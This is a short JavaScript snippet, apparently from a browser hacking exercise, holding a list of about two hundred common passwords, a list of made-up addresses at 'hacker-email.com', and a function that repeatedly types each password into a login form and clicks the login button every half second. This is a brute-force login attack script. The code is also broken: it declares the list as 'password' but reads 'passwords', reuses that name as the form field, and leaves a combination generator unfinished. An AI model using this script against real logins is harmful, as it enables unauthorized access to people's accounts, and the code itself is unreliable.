let password = [123456, 123456789, 12345, "qwerty", "password", 12345678, 111111, 123123, 1234567890, 1234567, "qwerty123", "000000", "1q2w3e", "aa12345678", "abc123", "password1", 1234, "qwertyuiop", 123321, "password123", "1q2w3e4r5t", "iloveyou", 654321, 666666, 987654321, 123, "123456a", "qwe123", "1q2w3e4r", 7777777, "1qaz2wsx", "123qwe", "zxcvbnm", 121212, "asdasd", "a123456", 555555, "dragon", 112233, 123123123, "monkey", 11111111, "qazwsx", 159753, "asdfghjkl", 222222, "1234qwer", "qwerty1", 123654, "123abc", "asdfgh", 777777, "aaaaaa", "myspace1", 88888888, "fuckyou", "123456789a", 999999, 888888, "football", "princess", 789456123, 147258369, 1111111, "sunshine", "michael", "computer", "qwer1234", "daniel", 789456, 11111, "abcd1234", "q1w2e3r4", "shadow", 159357, "123456q", 1111, "samsung", "killer", "asd123", "superman", "master", "12345a", "azerty", "zxcvbn", "qazwsxedc", 131313, "ashley", "target123", 987654, "baseball", "qwert", "asdasd123", "qwerty", "soccer", "charlie", "qweasdzxc", "tinkle", "jessica", "q1w2e3r4t5", "asdf", "test1", "1g2w3e4r", "gwerty123", "zag12wsx", "gwerty", 147258, 12341234, "qweqwe", "jordan", "pokemon", "q1w2e3r4t5y6", 12345678910, 1111111111, 12344321, "thomas", "love", "12qwaszx", 102030, "welcome", "liverpool", "iloveyou1", "michelle", 101010, 1234561, "hello", "andrew", "a123456789", "a12345", "Status", "fuckyou1", "1qaz2wsx3edc", "hunter", "princess1", "naruto", "justin", "jennifer", "qwerty12", "qweasd", "anthony", "andrea", "joshua", "asdf1234", "12345qwert", "1qazxsw2", "marina", "love123", 111222, "robert", 10203, "nicole", "letmein", "football1", "secret", 1234554321, "freedom", "michael1", 11223344, "qqqqqq", 123654789, "chocolate", "12345q", "internet", "q1w2e3", "google", "starwars", "mynoob", "qwertyui", 55555, "qwertyu", "lol123", "lovely", "monkey1", "nikita", "pakistan", 7758521, 87654321, 147852, "jordan23", 212121, 123789, 147852369, "123456789q", "qwe", "forever", 741852963, "123qweasd", "123456abc", "1q2w3e4r5t6y", "qazxsw", 456789, 232323, 999999999, "qwerty12345", "qwaszx", 1234567891, 456123, 444444, "qq123456", "xxx"];
let emails = [
    'abert.einstein@hacker-email.com',
    'grace.hopper@hacker-email.com',
    'marie.curie@hacker-email.com',
    'konrad.zuse@hacker-email.com',
    'stephanie-kwolek @hacker-email.com',
    'carl-friedrich.auss@hacker-email.com',
    'shirley-ann.jackson@hacker-email.com',
    'gertrude-belle.elion@hacker-email.com',
    'steve.wozniak@hacker-email.com',
    'rudolf.bayer@hacker-email.com',
    'ada.lovelace@hacker-email.com'
];

let index = 0;

function testPassword() {
    let currentPassword = passwords[index];
    console.log('Testing password', currentPassword);
    index++;
    password.type = 'text';
    password.value = currentPassword;
    loginButton.click();
    if (index < passwords.length) {
        setTimeout(testPassword, 500);
    }
}


let alphabet = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];
let combinations = [];

function nextCombination() {
    let combination = alphabet[index];
}